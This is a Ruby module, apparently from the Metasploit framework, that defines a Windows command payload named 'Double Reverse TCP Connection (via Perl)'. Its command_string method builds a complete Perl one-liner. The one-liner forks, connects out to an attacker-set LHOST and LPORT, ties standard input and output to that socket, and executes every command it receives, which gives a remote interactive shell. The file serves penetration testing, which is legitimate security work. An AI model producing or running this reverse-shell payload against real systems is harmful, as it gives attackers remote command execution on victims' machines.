##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 148

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Windows Command, Double Reverse TCP Connection (via Perl)',
        'Description' => 'Creates an interactive shell via perl',
        'Author' => ['cazz', 'aushack'],
        'License' => BSD_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_CMD,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShell,
        'PayloadType' => 'cmd',
        'RequiredCmd' => 'perl',
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
    register_advanced_options(
      [
        OptString.new('PerlPath', [true, 'The path to the Perl executable', 'perl'])
      ]
    )
  end

  #
  # Constructs the payload
  #
  def generate(_opts = {})
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    ver = Rex::Socket.is_ipv6?(datastore['LHOST']) ? '6' : ''
    lhost = Rex::Socket.is_ipv6?(datastore['LHOST']) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
    %{#{datastore['PerlPath']} -MIO -e "$p=fork;exit,if($p);$c=new IO::Socket::INET#{ver}(PeerAddr,\\"#{lhost}:#{datastore['LPORT']}\\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;"}
  end
end
